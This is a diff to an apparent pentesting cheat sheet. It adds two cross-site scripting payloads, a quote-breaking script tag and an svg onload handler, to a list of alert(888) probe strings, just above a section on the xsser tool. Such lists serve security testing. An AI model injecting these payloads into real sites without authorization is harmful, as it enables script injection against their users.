@@ -15,6 +15,7 @@
 ```Javascript
 a'"><script>alert(888)</script>
 a"><script>alert(888)</script>
+'">');<script>alert(888)</script>
 </title><script>alert(888)</script>
 '; alert(888)'//
 %27;+alert(888);//
@@ -30,6 +31,7 @@ a';alert(888);//
 a';alert(888);'
 /"><script>alert(888)</script>
 <BODY ONLOAD=alert(888)>
+"><svg onload=alert(888)>
 ```
 
 ## xsser
